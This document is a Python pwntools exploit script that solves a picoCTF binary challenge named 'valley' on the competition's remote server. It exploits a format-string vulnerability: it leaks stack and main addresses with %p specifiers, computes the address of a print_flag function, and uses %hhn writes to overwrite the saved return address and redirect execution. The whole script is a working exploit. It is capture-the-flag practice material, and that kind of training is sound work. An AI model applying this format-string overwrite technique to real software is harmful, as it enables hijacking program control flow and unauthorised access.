#!/usr/bin/env python3
from pwn import *
import time

bin_file = './valley'
context( os = 'linux', arch = 'amd64' )
context( terminal = ['tmux', 'splitw', '-h'] )
context.log_level = 'debug'

binf                = ELF( bin_file )
addr_main_offset    = binf.functions['main'].address
addr_flag_offset    = binf.functions['print_flag'].address
#addr_got_setbuf    = binf.got['setbuf']
addr_bss            = binf.bss()

diff = addr_main_offset - addr_flag_offset

info( f"addr_main_offset=0x{addr_main_offset:08X}, addr_flag_offset=0x{addr_flag_offset:08X}" )

def attack( proc, **kwargs ):
    
    if False:
        proc.sendlineafter( ': ', b'AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p' )
        info( proc.recvline() )
        info( proc.recvline() )
    else:
        #proc.sendlineafter( 'Shouting: ', b'%20$p %25$p'.ljust(16, b' ') )
        proc.sendlineafter( 'Shouting: ', b'%20$p %21$p'.ljust(16, b' ') )
    
    info( proc.recvuntil('distance: ') ) # You heard in the distance: 
    
    if True:
        addr = proc.recvline().decode('utf-8')
        lst_addr = addr.split()
        info( f"addr={addr}, lst_addr[0]={lst_addr[0]}, lst_addr[1]={lst_addr[1]}" )
        addr_stack = int( lst_addr[0], 16 ) - 8
        addr_main  = int( lst_addr[1], 16 ) - 18
        #addr_main = unpack( proc.recv(6), 'all' )
    
    else:
        info( proc.recvline() )
        info( proc.recvline() )
        info( proc.recvline() )
    
    addr_flag = addr_main - diff
    
    info( f"addr_main=0x{addr_main:08x}, addr_flag=0x{addr_flag:08x}, addr_stack=0x{addr_stack:08x}" )
    second = (addr_flag >> 8) & 0xFF
    first  = addr_flag        & 0xFF
    if first < second:
        ss = f"%{first}x%9$hhn%{second - first}x%10$hhn"
        info( f"first < second: ss={ss}" )
        proc.sendline( ss.encode('utf-8').ljust(24, b' ') + p64(addr_stack) + p64(addr_stack+1) ) # 0x4A 0x61
    else:
        ss = f"%{second}x%9$hhn%{first - second}x%10$hhn"
        info( f"first > second: ss={ss}" )
        proc.sendline( ss.encode('utf-8').ljust(24, b' ') + p64(addr_stack+1) + p64(addr_stack) )
    
    proc.sendline( b'exit' )
    
    info( proc.recvall() )

def main():
    
    adrs = "shape-facility.picoctf.net"
    #adrs = "localhost"
    port = 64417
    #port = 4000
    
    #proc = gdb.debug( bin_file )
    #proc = process( bin_file )
    proc = remote( adrs, port )
    
    attack( proc )
    #proc.interactive()

if __name__ == '__main__':
    main()
